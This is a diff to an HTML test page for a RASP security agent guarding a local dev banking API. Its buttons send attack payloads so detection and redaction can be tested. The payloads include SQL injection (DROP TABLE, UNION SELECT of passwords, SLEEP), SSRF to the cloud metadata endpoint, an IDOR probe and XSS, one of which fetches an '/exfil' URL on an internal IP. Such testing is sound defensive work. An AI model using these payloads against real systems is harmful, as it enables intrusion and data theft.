@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Banking API — RASP Test Lab</title>
+  <title>Banking API - RASP Test Lab</title>
   <style>
     *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
 
@@ -16,7 +16,7 @@
     }
 
     header {
-      max-width: 900px;
+      max-width: 1280px;
       margin: 0 auto 2.5rem;
     }
     header h1 { font-size: 1.5rem; font-weight: 700; }
@@ -48,13 +48,23 @@
     }
     .mode-badge strong { color: #f59e0b; }
 
-    .grid {
-      max-width: 900px;
+    .page-layout {
+      max-width: 1280px;
       margin: 0 auto;
+      display: grid;
+      grid-template-columns: 1fr 340px;
+      gap: 1.25rem;
+      align-items: start;
+    }
+
+    .grid {
       display: grid;
       grid-template-columns: 1fr 1fr;
       gap: 1.25rem;
       align-items: start;
+    }
+    @media (max-width: 900px) {
+      .page-layout { grid-template-columns: 1fr; }
     }
     @media (max-width: 640px) { .grid { grid-template-columns: 1fr; } }
 
@@ -68,6 +78,14 @@
     .card h2 { font-size: .85rem; font-weight: 600; text-transform: uppercase; letter-spacing: .07em; margin-bottom: 1rem; }
     .card.attack h2 { color: #f87171; }
     .card.safe   h2 { color: #34d399; }
+    .card.privacy { border-color: #1e3a5f; }
+    .card.privacy h2 { color: #60a5fa; }
+    .card .note {
+      font-size: .72rem;
+      color: #64748b;
+      line-height: 1.5;
+      margin-bottom: .9rem;
+    }
 
     .btn-group {
       display: flex;
@@ -110,8 +128,8 @@
     button .icon { flex-shrink: 0; font-size: 1rem; padding-top: .05rem; }
 
     .result-section {
-      max-width: 900px;
-      margin: 1.25rem auto 0;
+      position: sticky;
+      top: 1rem;
     }
     .result-section h2 {
       font-size: .85rem;
@@ -130,7 +148,7 @@
       font-size: .8rem;
       white-space: pre-wrap;
       word-break: break-all;
-      min-height: 120px;
+      min-height: 300px;
       color: #94a3b8;
     }
     #result.ok      { border-color: #065f46; color: #34d399; }
@@ -157,8 +175,8 @@
 <body>
 
 <header>
-  <h1>Banking API — RASP Test Lab</h1>
-  <span class="tag">DEV ONLY — DO NOT DEPLOY</span>
+  <h1>Banking API - RASP Test Lab</h1>
+  <span class="tag">DEV ONLY - DO NOT DEPLOY</span>
   <p>
     Click a button to send a request to the local server. The RASP agent inspects
     every request before the route handler runs. In <strong>monitor</strong> mode the
@@ -168,10 +186,19 @@
   <div class="mode-badge">
     Mode: <strong id="mode-label">loading…</strong>
     &nbsp;|&nbsp;
+    Channel: <strong id="channel-label">…</strong>
+    &nbsp;|&nbsp;
+    HMAC: <strong id="hmac-label">…</strong>
+    &nbsp;|&nbsp;
+    Self-protect: <strong id="selfprotect-label">…</strong>
+    &nbsp;|&nbsp;
+    Policy v.: <strong id="policy-label">…</strong>
+    &nbsp;|&nbsp;
     Collector: <strong id="collector-label">loading…</strong>
   </div>
 </header>
 
+<div class="page-layout">
 <div class="grid">
 
   <!-- Safe requests -->
@@ -227,6 +254,14 @@
         </span>
       </button>
 
+      <button onclick="sendWithHeaders('GET', '/api/users/1', null, { 'Authorization': 'Bearer ' + JWT_USER1 })">
+        <span class="icon">✅</span>
+        <span>
+          <span class="label">BOLA - legit (own record)</span>
+          <span class="payload">GET /api/users/1  (JWT sub=1, matches → no event)</span>
+        </span>
+      </button>
+
     </div>
   </div>
 
@@ -254,7 +289,7 @@
       <button onclick="send('GET', '/api/users/1?id=1; DROP TABLE users--')">
         <span class="icon">💣</span>
         <span>
-          <span class="label">SQL — DROP TABLE</span>
+          <span class="label">SQL - DROP TABLE</span>
           <span class="payload">?id=1; DROP TABLE users--</span>
         </span>
       </button>
@@ -262,7 +297,7 @@
       <button onclick="send('GET', '/api/users/1?id=1 UNION SELECT username,password FROM users--')">
         <span class="icon">🔓</span>
         <span>
-          <span class="label">SQL Injection — UNION SELECT</span>
+          <span class="label">SQL Injection - UNION SELECT</span>
           <span class="payload">?id=1 UNION SELECT username,password FROM users--</span>
         </span>
       </button>
@@ -294,7 +329,7 @@
       <button onclick="send('GET', '/api/users/1?id=1%20AND%20SLEEP(5)--')">
         <span class="icon">⏱️</span>
         <span>
-          <span class="label">Blind SQLi — SLEEP</span>
+          <span class="label">Blind SQLi - SLEEP</span>
           <span class="payload">?id=1 AND SLEEP(5)--</span>
         </span>
       </button>
@@ -310,7 +345,7 @@
       <button onclick="send('GET', '/api/transactions?search=http://169.254.169.254/latest/meta-data/')">
         <span class="icon">🌐</span>
         <span>
-          <span class="label">SSRF — AWS metadata endpoint</span>
+          <span class="label">SSRF - AWS metadata endpoint</span>
           <span class="payload">?search=http://169.254.169.254/latest/meta-data/</span>
         </span>
       </button>
@@ -331,18 +366,19 @@
         </span>
       </button>
 
-      <button onclick="send('GET', '/api/users/2')">
+
+      <button onclick="sendWithHeaders('GET', '/api/users/2', null, { 'Authorization': 'Bearer ' + JWT_USER1 })">
         <span class="icon">🔁</span>
         <span>
-          <span class="label">BOLA / IDOR — access another user</span>
-          <span class="payload">GET /api/users/2  (JWT sub mismatch probe)</span>
+          <span class="label">BOLA / IDOR - access another user</span>
+          <span class="payload">GET /api/users/2  (JWT sub=1 ≠ id 2 → bola event)</span>
         </span>
       </button>
 
       <button onclick="sendWithHeaders('GET', '/api/users/1', null, { 'X-Probe': 'A'.repeat(9000) })">
         <span class="icon">📦</span>
         <span>
-          <span class="label">Suspicious Headers — oversized value</span>
+          <span class="label">Suspicious Headers - oversized value</span>
           <span class="payload">X-Probe: &lt;9000-char string&gt;</span>
         </span>
       </button>
@@ -366,6 +402,70 @@
     </div>
   </div>
 
+  <!-- Data privacy: value-based redaction -->
+  <div class="card privacy">
+    <h2>Data privacy (value redaction)</h2>
+    <p class="note">
+      These payloads embed PII inside an attack. The detector fires, and the agent
+      value-redacts the matched value <em>before</em> telemetry leaves the process.
+      The masked value (<code>[EMAIL:&lt;hash&gt;]</code>, <code>****-****-****-1111</code>,
+      <code>[SIN REDACTED]</code>, <code>[HEALTH_ID REDACTED]</code>, <code>[IP:&lt;hash&gt;]</code>,
+      <code>[REDACTED]</code>) is visible in the dashboard and <code>rasp-audit.log</code>
+      - not in the Response below.
+    </p>
+    <div class="btn-group">
+
+      <button onclick="send('GET', &quot;/api/transactions?search=<script>alert('alice@acme.io')</script>&quot;)">
+        <span class="icon">📧</span>
+        <span>
+          <span class="label">XSS + email → [EMAIL:&lt;hash&gt;]</span>
+          <span class="payload">?search=&lt;script&gt;alert('alice@acme.io')&lt;/script&gt;</span>
+        </span>
+      </button>
+
+      <button onclick="send('GET', &quot;/api/users/1?id=1' UNION SELECT 4111111111111111--&quot;)">
+        <span class="icon">💳</span>
+        <span>
+          <span class="label">SQLi + credit card → ****-****-****-1111</span>
+          <span class="payload">?id=1' UNION SELECT 4111111111111111--</span>
+        </span>
+      </button>
+
+      <button onclick="send('GET', &quot;/api/users/1?id=1' OR '046-454-286'='046-454-286&quot;)">
+        <span class="icon">🪪</span>
+        <span>
+          <span class="label">SQLi + Canadian SIN → [SIN REDACTED]</span>
+          <span class="payload">?id=1' OR '046-454-286'='046-454-286</span>
+        </span>
+      </button>
+
+      <button onclick="send('GET', &quot;/api/users/1?id=1' UNION SELECT MULL56072112--&quot;)">
+        <span class="icon">🏥</span>
+        <span>
+          <span class="label">SQLi + RAMQ health ID → [HEALTH_ID REDACTED]</span>
+          <span class="payload">?id=1' UNION SELECT MULL56072112--</span>
+        </span>
+      </button>
+
+      <button onclick="send('GET', &quot;/api/transactions?search=<script>fetch('http://192.168.1.42/exfil')</script>&quot;)">
+        <span class="icon">🌐</span>
+        <span>
+          <span class="label">XSS + internal IP → [IP:&lt;hash&gt;]</span>
+          <span class="payload">?search=&lt;script&gt;fetch('http://192.168.1.42/exfil')&lt;/script&gt;</span>
+        </span>
+      </button>
+
+      <button onclick="send('POST', '/api/auth/login', { email: 'admin@acme.io', password: &quot;' OR '1'='1&quot; })">
+        <span class="icon">🔑</span>
+        <span>
+          <span class="label">SQLi body + password key → [REDACTED] (key-based)</span>
+          <span class="payload">POST /api/auth/login - password field replaced wholesale</span>
+        </span>
+      </button>
+
+    </div>
+  </div>
+
 </div>
 
 <!-- Result panel -->
@@ -374,12 +474,22 @@
   <div id="result">Click a button above to send a request…</div>
 </div>
 
+</div><!-- /.page-layout -->
+
 <script>
-  // Fetch RASP mode from /health on load
+  // Unsigned dev JWT (sub=1). The BOLA detector only reads the `sub` claim as a
+  // heuristic cross-check; it never verifies the signature.
+  const JWT_USER1 = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIn0.demo';
+
+  // Fetch RASP runtime state from /health on load
   fetch('/health')
     .then(r => r.json())
     .then(d => {
       document.getElementById('mode-label').textContent = d.mode ?? '?';
+      document.getElementById('channel-label').textContent = d.channel ?? '?';
+      document.getElementById('hmac-label').textContent = d.hmac ? 'on' : 'off';
+      document.getElementById('selfprotect-label').textContent = d.selfProtect ? 'on' : 'off';
+      document.getElementById('policy-label').textContent = d.policyVersion ?? 0;
     })
     .catch(() => {
       document.getElementById('mode-label').textContent = 'unknown';
@@ -420,7 +530,7 @@
         : '';
       el.innerHTML =
         `<div class="status-line"><span class="status-dot ${isBlocked ? 'blocked' : 'ok'}"></span>` +
-        `HTTP ${res.status} — ${ms}ms${isBlocked ? ' — BLOCKED by RASP' : ''}</div>` +
+        `HTTP ${res.status} - ${ms}ms${isBlocked ? ' - BLOCKED by RASP' : ''}</div>` +
         `${method} ${url}\n\n` +
         (body ? `Request body:\n${JSON.stringify(body, null, 2)}\n\n` : '') +
         headerNote +
